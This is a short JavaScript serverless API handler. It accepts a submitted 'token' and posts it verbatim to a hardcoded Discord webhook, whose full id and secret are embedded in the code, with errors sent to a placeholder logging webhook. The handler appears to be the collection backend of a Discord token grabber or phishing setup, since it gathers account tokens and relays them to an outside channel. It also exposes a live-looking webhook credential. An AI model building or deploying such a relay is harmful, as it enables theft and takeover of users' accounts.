import fetch from 'node-fetch';

// Helper function to send logs to a dedicated log channel or external service.
async function logError(message) {
  // Optionally send logs to an external service or your own Discord server
  const logWebhook = 'https://your-log-webhook-url';
  await fetch(logWebhook, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ content: message }),
  });
}

// Helper function to validate token (basic validation).
function validateToken(token) {
  if (!token || token.trim().length === 0) {
    throw new Error('Token cannot be empty');
  }
}

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { token } = req.body;

    try {
      // Validate token input
      validateToken(token);

      // Discord webhook URL
      const webhookURL = 'https://discord.com/api/webhooks/1333612145115664394/qAG8XiHS0hI9TfNqR2jKViMZ4vZDd_H0Dr7caazZ0Y0LNL_sA9P2rfPvtRgqhr2ZtvYN';

      // Sending token to Discord webhook
      const response = await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `Token received: ${token}`,
        }),
      });

      const responseBody = await response.json();

      // Check if the response was successful
      if (response.ok) {
        res.status(200).json({ message: 'Token sent successfully!', response: responseBody });
      } else {
        throw new Error(`Discord responded with an error: ${responseBody.message}`);
      }

    } catch (error) {
      // Log error and send user-friendly response
      await logError(`Error: ${error.message}`);
      res.status(500).json({ error: 'Failed to send token', details: error.message });
    }
  } else {
    res.status(405).json({ error: 'Method Not Allowed' });
  }
}
